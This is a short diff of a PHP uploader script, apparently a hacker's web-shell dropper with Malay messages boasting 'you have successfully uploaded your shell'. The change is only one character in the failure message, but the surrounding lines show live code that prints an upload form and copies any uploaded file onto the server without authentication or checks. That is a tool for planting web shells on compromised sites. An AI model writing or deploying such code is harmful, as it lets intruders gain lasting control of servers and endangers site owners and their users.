@@ -4,6 +4,6 @@ echo '<form action="" method="post" enctype="multipart/form-data" name="uploader
 echo '<input type="file" name="file" size="50"><input name="_upl" type="submit" id="_upl" value="Upload"></form>';
 if( $_POST['_upl'] == "Upload" ) {
 if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) { echo '<b>Korang Dah Berjaya Upload Shell Korang!!!<b><br><br>'; }
-else { echo '<b>Korang Gagal Upload Shells Korang!!!</b><br><br>'; }
+else { echo '<b>Korang Gagal Upload Shells zKorang!!!</b><br><br>'; }
 }
 ?>
